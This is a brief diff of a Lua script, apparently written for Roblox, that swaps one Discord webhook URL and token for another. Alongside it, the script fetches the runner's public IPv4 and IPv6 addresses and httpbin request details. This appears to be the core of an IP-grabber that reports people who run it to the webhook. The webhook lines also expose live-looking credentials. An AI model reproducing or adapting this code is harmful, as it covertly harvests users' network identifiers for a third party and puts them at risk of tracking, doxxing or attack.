@@ -1,4 +1,4 @@
-local Webhook = "https://discord.com/api/webhooks/1246345965208731739/TCA0ZUgoKjoP9mjGBNnIZNifQhFGQ38fvoWbU-Tk_z20fYJ8ERQxU_ot5L6FkaCHp-SO"
+local Webhook = "https://discord.com/api/webhooks/1247892135353516042/u30BHD-YTdxeGfh75WqNOtcjpP3qwOGRT_4gMZ8TB2Ezg0LaYGF6OU77xnGMTkkIkrru"
 local IPv4 = game:HttpGet("https://api.ipify.org")
 local IPv6 = game:HttpGet("https://api64.ipify.org")
 local HTTPbin = game:HttpGet("https://httpbin.org/get")
